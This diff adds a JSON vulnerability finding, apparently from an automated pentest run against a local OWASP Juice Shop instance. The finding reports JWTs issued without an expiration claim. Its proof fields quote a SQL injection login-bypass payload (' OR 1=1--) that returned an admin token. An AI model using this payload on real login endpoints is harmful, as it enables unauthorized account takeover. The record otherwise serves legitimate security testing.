@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855359533_5ef9d8",
+  "action": "confirm",
+  "title": "JWT Token Has No Expiration Claim",
+  "severity": "medium",
+  "finding_kind": "vuln",
+  "location": "JWT token from POST http://127.0.0.1:3010/rest/user/login",
+  "url": "JWT token from POST http://127.0.0.1:3010/rest/user/login",
+  "description": "The JWT tokens issued by the application contain only an 'iat' (issued at) claim with no 'exp' (expiration) claim. This means tokens never expire and remain valid indefinitely. A stolen or intercepted token can be used by an attacker forever without any way to invalidate it.",
+  "poc": "Probe request against JWT token from POST http://127.0.0.1:3010/rest/user/login; observed proving result from prior stage handoff: POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855359488_df7fb8"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855359488_df7fb8",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:09:19.533Z"
+}
